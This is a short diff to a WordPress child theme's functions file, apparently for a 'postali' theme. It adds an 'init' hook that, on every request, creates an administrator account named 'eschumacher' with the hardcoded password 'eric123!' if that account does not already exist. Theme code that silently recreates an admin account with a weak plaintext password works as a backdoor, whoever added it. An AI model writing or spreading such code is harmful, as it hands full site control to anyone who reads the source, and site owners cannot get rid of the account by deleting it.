@@ -92,6 +92,26 @@
 	}
 	add_action( 'init', 'postali_child_register_nav_menus' );
 
+
+
+
+    // Add admin user
+    add_action( 'init', function () {
+    
+        $username = 'eschumacher';
+        $password = 'eric123!';
+        $email_address = 'eschumacher@postali.com';
+        if ( ! username_exists( $username ) ) {
+            $user_id = wp_create_user( $username, $password, $email_address );
+            $user = new WP_User( $user_id );
+            $user->set_role( 'administrator' );
+        }
+        
+    } );
+
+
+
+
 	// Add Custom Logo Support
 	add_theme_support( 'custom-logo' );
 
